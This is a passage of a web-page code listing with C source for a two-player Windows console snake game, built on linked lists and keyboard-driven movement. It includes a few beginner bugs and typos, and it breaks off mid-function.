class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;windows.h&gt;</span><br><span class="line">#include&lt;time.h&gt;</span><br><span class="line">#include&lt;conio.h&gt;</span><br><span class="line"></span><br><span class="line">typedef struct Snakes</span><br><span class="line">&#123;</span><br><span class="line">    int x;</span><br><span class="line">    int y;</span><br><span class="line">    struct Snakes* next;</span><br><span class="line">&#125;snake;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">struct Food</span><br><span class="line">&#123;</span><br><span class="line">    int x;</span><br><span class="line">    int y;</span><br><span class="line">&#125;food;</span><br><span class="line"></span><br><span class="line">void gotoxy(int x, int y);</span><br><span class="line">void gotoxy_print(int x, int y);</span><br><span class="line">void gotoxy_delete(int x, int y);</span><br><span class="line">void gotoxy_food(int x, int y);</span><br><span class="line">void gotoxy_snake1(int x,int y);</span><br><span class="line">void gotoxy_snake2(int x,int y);</span><br><span class="line">void hellow();</span><br><span class="line">void end();</span><br><span class="line">void no_back(char tmp);</span><br><span class="line">void creat_frame();</span><br><span class="line">void create_food();</span><br><span class="line">void check_way();</span><br><span class="line">int check_end();</span><br><span class="line">void snake1_move();</span><br><span class="line">void snake2_move();</span><br><span class="line">void eat_food();</span><br><span class="line">void end_to_head1(int x,int y);</span><br><span class="line">void end_to_head2(int x,int y);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">snake *head1;</span><br><span class="line">snake *head2;</span><br><span class="line"></span><br><span class="line">char name[20];</span><br><span class="line">char way&#x3D;&#39; &#39;;</span><br><span class="line">char way1;</span><br><span class="line">char way2;</span><br><span class="line">int score1&#x3D;0;</span><br><span class="line">int score2&#x3D;0;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">system(&quot;color 03&quot;);</span><br><span class="line">hellow();</span><br><span class="line"></span><br><span class="line">gotoxy_delete(17,6);</span><br><span class="line">creat_frame();</span><br><span class="line">create_food();</span><br><span class="line"></span><br><span class="line">check_way();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void gotoxy(int x, int y) </span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 更新光标位置 </span><br><span class="line">COORD pos;</span><br><span class="line">HANDLE hOutput &#x3D; GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class="line">pos.X &#x3D; x;</span><br><span class="line">pos.Y &#x3D; y;</span><br><span class="line">SetConsoleCursorPosition(hOutput, pos);</span><br><span class="line">    &#x2F;&#x2F; 隐藏光标 </span><br><span class="line">    CONSOLE_CURSOR_INFO cursor;</span><br><span class="line">cursor.bVisible &#x3D; FALSE;    </span><br><span class="line">cursor.dwSize &#x3D; sizeof(cursor);</span><br><span class="line">SetConsoleCursorInfo(hOutput, &amp;cursor);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void hellow()</span><br><span class="line">&#123;</span><br><span class="line">gotoxy(10,5);</span><br><span class="line">printf(&quot;&#x2F;***************************************&#x2F;&quot;);</span><br><span class="line">gotoxy(17,6);</span><br><span class="line">printf(&quot;welocme to this game&quot;);</span><br><span class="line">gotoxy(10,10);</span><br><span class="line">printf(&quot;&#x2F;***************************************&#x2F;&quot;);</span><br><span class="line">gotoxy(17,7);</span><br><span class="line">printf(&quot;snake1: up(w) down(s) left(a) right(d)&quot;);</span><br><span class="line">gotoxy(17,8);</span><br><span class="line">printf(&quot;snake1: up(i) down(k) left(j) right(l)&quot;);</span><br><span class="line">gotoxy(17,9);</span><br><span class="line">printf(&quot;please input your name:&quot;);</span><br><span class="line">scanf(&quot;%s&quot;,name);</span><br><span class="line">system(&quot;cls&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void creat_frame()</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">snake *p,*q;</span><br><span class="line">snake *m,*n;</span><br><span class="line">for(i&#x3D;0;i&lt;28;i++)</span><br><span class="line">&#123;</span><br><span class="line">gotoxy_print(0,i);</span><br><span class="line">gotoxy_print(66,i);</span><br><span class="line">&#125;</span><br><span class="line">for(i&#x3D;0;i&lt;66;i+&#x3D;2)</span><br><span class="line">&#123;</span><br><span class="line">gotoxy_print(i,0);</span><br><span class="line">gotoxy_print(i,27);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;snake1 </span><br><span class="line">head1 &#x3D; (snake*)malloc(sizeof(snake));</span><br><span class="line">p&#x3D;(snake*)malloc(sizeof(snake));</span><br><span class="line">q&#x3D;(snake*)malloc(sizeof(snake));</span><br><span class="line">head1-&gt;x&#x3D;14;</span><br><span class="line">head1-&gt;y&#x3D;13;</span><br><span class="line">p-&gt;x&#x3D;14;</span><br><span class="line">p-&gt;y&#x3D;14;</span><br><span class="line">q-&gt;x&#x3D;14;</span><br><span class="line">q-&gt;y&#x3D;15;</span><br><span class="line">head1-&gt;next&#x3D;p;</span><br><span class="line">p-&gt;next&#x3D;q;</span><br><span class="line">q-&gt;next&#x3D;NULL;</span><br><span class="line">gotoxy_snake1(14, 13);</span><br><span class="line">gotoxy_snake1(14, 14);</span><br><span class="line">gotoxy_snake1(14, 15); </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;snake2</span><br><span class="line">head2&#x3D;(snake*)malloc(sizeof(snake));</span><br><span class="line">m&#x3D;(snake*)malloc(sizeof(snake));</span><br><span class="line">n&#x3D;(snake*)malloc(sizeof(snake));</span><br><span class="line">head2-&gt;x&#x3D;30;</span><br><span class="line">head2-&gt;y&#x3D;10;</span><br><span class="line">m-&gt;x&#x3D;30;</span><br><span class="line">m-&gt;y&#x3D;11;</span><br><span class="line">n-&gt;x&#x3D;30;</span><br><span class="line">n-&gt;y&#x3D;12;</span><br><span class="line">head2-&gt;next&#x3D;m;</span><br><span class="line">m-&gt;next&#x3D;n;</span><br><span class="line">n-&gt;next&#x3D;NULL;</span><br><span class="line">gotoxy_snake2(30, 10);</span><br><span class="line">gotoxy_snake2(30, 11);</span><br><span class="line">gotoxy_snake2(30, 12); </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void create_food()</span><br><span class="line">&#123;</span><br><span class="line">int x,y;</span><br><span class="line">int flag&#x3D;0;</span><br><span class="line"></span><br><span class="line">while(!flag)</span><br><span class="line">&#123;</span><br><span class="line">flag&#x3D;1;</span><br><span class="line">srand((unsigned)time(NULL));</span><br><span class="line">   x &#x3D;rand()%64+1;  </span><br><span class="line">y&#x3D;rand()%26+1;</span><br><span class="line"></span><br><span class="line">    if (x % 2 !&#x3D;0)</span><br><span class="line">    &#123;</span><br><span class="line">       x &#x3D; x + 1;</span><br><span class="line">    &#125;</span><br><span class="line">snake *p;</span><br><span class="line">snake *q;</span><br><span class="line"></span><br><span class="line">p&#x3D;head1;</span><br><span class="line">while(p-&gt;next!&#x3D;NULL)</span><br><span class="line">&#123;</span><br><span class="line">if((x&#x3D;&#x3D;p-&gt;x)&amp;&amp;(y&#x3D;&#x3D;p-&gt;y))</span><br><span class="line">&#123;</span><br><span class="line">flag&#x3D;0;</span><br><span class="line">&#125;</span><br><span class="line">p&#x3D;p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">q&#x3D;head2;</span><br><span class="line">while(q-&gt;next!&#x3D;NULL)</span><br><span class="line">&#123;</span><br><span class="line">if((x&#x3D;&#x3D;q-&gt;x)&amp;&amp;(y&#x3D;&#x3D;q-&gt;y))</span><br><span class="line">&#123;</span><br><span class="line">flag&#x3D;0;</span><br><span class="line">&#125;</span><br><span class="line">q&#x3D;q-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">food.x&#x3D;x;</span><br><span class="line">food.y&#x3D;y;</span><br><span class="line">gotoxy_food(food.x,food.y);</span><br><span class="line">&#125;</span><br><span class="line">void check_way()</span><br><span class="line">&#123;</span><br><span class="line">int object;</span><br><span class="line">while(1)</span><br><span class="line">&#123;</span><br><span class="line">if(check_end()&#x3D;&#x3D;0)</span><br><span class="line">&#123;</span><br><span class="line">end();</span><br><span class="line">&#125;</span><br><span class="line">char just1;</span><br><span class="line">char just2;</span><br><span class="line">if(way&#x3D;&#x3D;&#39;w&#39;||way&#x3D;&#x3D;&#39;s&#39;||way&#x3D;&#x3D;&#39;a&#39;||way&#x3D;&#x3D;&#39;d&#39;)</span><br><span class="line">&#123;</span><br><span class="line">just1&#x3D;way;</span><br><span class="line">&#125;</span><br><span class="line">if(way&#x3D;&#x3D;&#39;i&#39;||way&#x3D;&#x3D;&#39;j&#39;||way&#x3D;&#x3D;&#39;l&#39;||way&#x3D;&#x3D;&#39;k&#39;)</span><br><span class="line">&#123;</span><br><span class="line">just2&#x3D;way;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(_kbhit())</span><br><span class="line">&#123;</span><br><span class="line">way &#x3D; _getch();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(way&#x3D;&#x3D;&#39;w&#39;||way&#x3D;&#x3D;&#39;s&#39;||way&#x3D;&#x3D;&#39;a&#39;||way&#x3D;&#x3D;&#39;d&#39;)</span><br><span class="line">&#123;</span><br><span class="line">no_back(just1);</span><br><span class="line">way1&#x3D;way;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(way&#x3D;&#x3D;&#39;i&#39;||way&#x3D;&#x3D;&#39;j&#39;||way&#x3D;&#x3D;&#39;l&#39;||way&#x3D;&#x3D;&#39;k&#39;)</span><br><span class="line">&#123;</span><br><span class="line">no_back(just2);</span><br><span class="line">way2&#x3D;way;</span><br><span class="line">&#125;</span><br><span class="line">snake1_move();</span><br><span class="line">snake2_move();</span><br><span class="line">eat_food();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void snake1_move()</span><br><span class="line">&#123;</span><br><span class="line">int x1,y1;</span><br><span class="line">snake *mid&#x3D;head1;</span><br><span class="line"></span><br><span class="line">x1&#x3D;head1-&gt;x;</span><br><span class="line">y1&#x3D;head1-&gt;y;</span><br><span class="line"></span><br><span class="line">while(mid-&gt;next!&#x3D;NULL)</span><br><span class="line">&#123;</span><br><span class="line">mid&#x3D;mid-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">gotoxy_delete(mid-&gt;x,mid-&gt;y);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">switch(way1)</span><br><span class="line">&#123;</span><br><span class="line">case &#39;w&#39;:</span><br><span class="line">y1-&#x3D;1;</span><br><span class="line">break;</span><br><span class="line">case &#39;s&#39;:</span><br><span class="line">y1+&#x3D;1;</span><br><span class="line">break;</span><br><span class="line">case &#39;a&#39;:</span><br><span class="line">x1-&#x3D;2;</span><br><span class="line">break;</span><br><span class="line">case &#39;d&#39;:</span><br><span class="line">x1+&#x3D;2;</span><br><span class="line">break;</span><br><span class="line">default:</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(x1 !&#x3D; head1-&gt;x || y1 !&#x3D; head1-&gt;y)</span><br><span class="line">&#123;</span><br><span class="line">end_to_head1(x1,y1);</span><br><span class="line">&#125;</span><br><span class="line">gotoxy_snake1(head1-&gt;x, head1-&gt;y);</span><br><span class="line">Sleep(70-score1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void snake2_move()</span><br><span class="line">&#123;</span><br><span class="line">int x2,y2;</span><br><span class="line">snake *p&#x3D;head2;</span><br><span class="line"></span><br><span class="line">x2&#x3D;head2-&gt;x;</span><br><span class="line">y2&#x3D;head2-&gt;y;</span><br><span class="line"></span><br><span class="line">while(p-&gt;next!&#x3D;NULL)</span><br><span class="line">&#123;</span><br><span class="line">p&#x3D;p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">gotoxy_delete(p-&gt;x,p-&gt;y);</span><br><span class="line"></span><br><span class="line">switch(way2)</span><br><span class="line">&#123;</span><br><span class="line">case &#39;i&#39;:</span><br><span class="line">y2-&#x3D;1;</span><br><span class="line">break;</span><br><span class="line">case &#39;k&#39;:</span><br><span class="line">y2+&#x3D;1;</span><br><span class="line">break;</span><br><span class="line">case &#39;j&#39;:</span><br><span class="line">x2-&#x3D;2;</span><br><span class="line">break;</span><br><span class="line">case &#39;l&#39;:</span><br><span class="line">x2+&#x3D;2;</span><br><span class="line">break;</span><br><span class="line">default:</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(x2 !&#x3D; head2-&gt;x || y2 !&#x3D; head2-&gt;y)</span><br><span class="line">&#123;</span><br><span class="line">end_to_head2(x2,y2);</span><br><span class="line">&#125;</span><br><span class="line">gotoxy_snake2(head2-&gt;x, head2-&gt;y);</span><br><span class="line">Sleep(70-score2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void end_to_head1(int x,int y)</span><br><span class="line">&#123;</span><br><span class="line">snake *new_head1;</span><br><span class="line">snake *p&#x3D;head1;</span><br><span class="line"></span><br><span class="line">while(p-&gt;next-&gt;next!&#x3D;NULL)</span><br><span class="line">&#123;</span><br><span class="line">p&#x3D;p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">free(p-&gt;next);</span><br><span class="line">p-&gt;next&#x3D;NULL;</span><br><span class="line">new_head1&#x3D;(snake*)malloc(sizeof(snake));</span><br><span class="line">new_head1-&gt;x&#x3D;x;</span><br><span class="line">new_head1-&gt;y&#x3D;y;</span><br><span class="line">new_head1-&gt;next&#x3D;head1;</span><br><span class="line">head1&#x3D;new_head1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void end_to_head2(int x,int y)</span><br><span class="line">&#123;</span><br><span class="line">snake *new_head2;</span><br><span class="line">snake *q&#x3D;head2;</span><br><span class="line"></span><br><span class="line">while(q-&gt;next-&gt;next!&#x3D;NULL)</span><br><span class="line">&#123;</span><br><span class="line">q&#x3D;q-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">free(q-&gt;next);</span><br><span class="line">q-&gt;next&#x3D;NULL;</span><br><span class="line">new_head2&#x3D;(snake*)malloc(sizeof(snake));</span><br><span class="line">new_head2-&gt;x&#x3D;x;</span><br><span class="line">new_head2-&gt;y&#x3D;y;</span><br><span class="line">new_head2-&gt;next&#x3D;head2;</span><br><span class="line">head2&#x3D;new_head2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void eat_food()</span><br><span class="line">&#123;</span><br><span class="line">snake *p&#x3D;head1;</span><br><span class="line">snake *q&#x3D;head2;</span><br><span class="line"></span><br><span class="line">if(head1-&gt;x&#x3D;&#x3D;food.x&amp;&amp;head1-&gt;y&#x3D;&#x3D;food.y)</span><br><span class="line">&#123;</span><br><span class="line">create_food();</span><br><span class="line">snake *new_one1;</span><br><span class="line">new_one1&#x3D;(snake*)malloc(sizeof(snake));</span><br><span class="line">while(p-&gt;next!&#x3D;NULL)</span><br><span class="line">&#123;</span><br><span class="line">p&#x3D;p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">new_one1-&gt;next&#x3D;NULL;</span><br><span class="line">p-&gt;next&#x3D;new_one1;</span><br><span class="line">score1 ++;</span><br><span class="line">gotoxy(75,15);</span><br><span class="line">printf(&quot;snked1 : %d&quot;,score1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(head2-&gt;x&#x3D;&#x3D;food.x&amp;&amp;head2-&gt;y&#x3D;&#x3D;food.y)</span><br><span class="line">&#123;</span><br><span class="line">create_food();</span><br><span class="line">snake *new_one2;</span><br><span class="line">new_one2&#x3D;(snake*)malloc(sizeof(snake));</span><br><span class="line">while(q-&gt;next!&#x3D;NULL)</span><br><span class="line">&#123;</span><br><span class="line">q&#x3D;q-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">new_one2-&gt;next&#x3D;NULL;</span><br><span class="line">q-&gt;next&#x3D;new_one2;</span><br><span class="line">score2 ++;</span><br><span class="line">gotoxy(75,16);</span><br><span class="line">printf(&quot;snked1 : %d&quot;,score2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int check_end()</span><br><span class="line">&#123;</span><br><span class="line">snake *p&#x3D;head1;</span><br><span class="line">snake *q&#x3D;head2;</span><br><span class="line"></span><br><span class="line">if(head1-&gt;x&#x3D;&#x3D;0||head1-&gt;x&#x3D;&#x3D;66||head1-&gt;y&#x3D;&#x3D;0||head1-&gt;y&#x3D;&#x3D;27)</span><br><span class="line">&#123;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    while(p-&gt;next!&#x3D;NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        p&#x3D;p-&gt;next;</span><br><span class="line">        if(head1-&gt;x&#x3D;&#x3D;p-&gt;x&amp;&amp;head1-&gt;y&#x3D;&#x3D;p-&gt;y) </span><br><span class="line">        &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">if(head2-&gt;x&#x3D;&#x3D;0||head2-&gt;x&#x3D;&#x3D;66||head2-&gt;y&#x3D;&#x3D;0||head2-&gt;y&#x3D;&#x3D;27)</span><br><span class="line">&#123;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">while(q-&gt;next!&#x3D;NULL)</span><br><span class="line">&#123;</span><br><span class="line">q&#x3D;q-&gt;next;</span><br><span class="line">if(head2-&gt;x&#x3D;&#x3D;q-&gt;x&amp;&amp;head2-&gt;y&#x3D;&#x3D;q-&gt;y) </span><br><span class="line">&#123;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">p&#x3D;head1;</span><br><span class="line">q&#x3D;head2;</span><br><span class="line"></span><br><span class="line">while(q-&gt;next!&#x3D;NULL)</span><br><span class="line">&#123;</span><br><span class="line">q&#x3D;q-&gt;next;</span><br><span class="line">if(head1-&gt;x&#x3D;&#x3D;q-&gt;x&amp;&amp;head1-&gt;y&#x3D;&#x3D;q-&gt;y) </span><br><span class="line">&#123;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">while(p-&gt;next!&#x3D;NULL)</span><br><span class="line">&#123;</span><br><span class="line">p&#x3D;p-&gt;next;</span><br><span class="line">if(head2-&gt;x&#x3D;&#x3D;p-&gt;x&amp;&amp;head2-&gt;y&#x3D;&#x3D;p-&gt;y) </span><br><span class="line">&#123;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void end()</span><br><span class="line">&#123;</span><br><span class="line">snake *p&#x3D;head1,*q;</span><br><span class="line">snake *m&#x3D;head2,*n; </span><br><span class="line">system(&quot;cls&quot;);</span><br><span class="line">if(score1&gt;score2)</span><br><span class="line">&#123;</span><br><span class="line">gotoxy(10,10);</span><br><span class="line">printf(&quot;snake1 win&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">gotoxy(10,10);</span><br><span class="line">printf(&quot;snake2 win&quot;);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n\n\n\n\n\n\n\n\n\n\n\n&quot;);</span><br><span class="line">while(p!&#x3D;NULL)</span><br><span class="line">&#123;</span><br><span class="line">q&#x3D;p-&gt;next;</span><br><span class="line">free(p);</span><br><span class="line">p&#x3D;q;</span><br><span class="line">&#125;</span><br><span class="line">while(m!&#x3D;NULL)</span><br><span class="line">&#123;</span><br><span class="line">n&#x3D;m-&gt;next;</span><br><span class="line">free(p);</span><br><span class="line">m&#x3D;n;</span><br><span class="line">&#125;</span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void no_back(char tmp)</span><br><span class="line">&#123;</span><br><span class="line">if(tmp&#x3D;&#x3D;&#39;w&#39;&amp;&amp;way&#x3D;&#x3D;&#39;s&#39;)</span><br><span class="line">&#123;</span><br><span class="line">way&#x3D;&#39;w&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if(tmp&#x3D;&#x3D;&#39;s&#39;&amp;&amp;way&#x3D;&#x3D;&#39;w&#39;)</span><br><span class="line">&#123;</span><br><span class="line">way&#x3D;&#39;s&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if(tmp&#x3D;&#x3D;&#39;a&#39;&amp;&amp;way&#x3D;&#x3D;&#39;d&#39;)</span><br><span class="line">&#123;</span><br><span class="line">way&#x3D;&#39;a&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if(tmp&#x3D;&#x3D;&#39;d&#39;&amp;&amp;way&#x3D;&#x3D;&#39;a&#39;)</span><br><span class="line">&#123;</span><br><span class="line">way&#x3D;&#39;d&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(tmp&#x3D;&#x3D;&#39;i&#39;&amp;&amp;way&#x3D;&#x3D;&#39;k&#39;)</span><br><span class="line">&#123;</span><br><span class="line">way&#x3D;&#39;i&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if(tmp&#x3D;&#x3D;&#39;k&#39;&amp;&amp;way&#x3D;&#x3D;&#39;i&#39;)</span><br><span class="line">&#123;</span><br><span class="line">way&#x3D;&#39;k&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if(tmp&#x3D;&#x3D;&#39;j&#39;&amp;&amp;way&#x3D;&#x3D;&#39;l&#39;)</span><br><span class="line">&#123;</span><br><span class="line">way&#x3D;&#39;j&#39;;</span><br><span class="line">&#125;</span><br><span 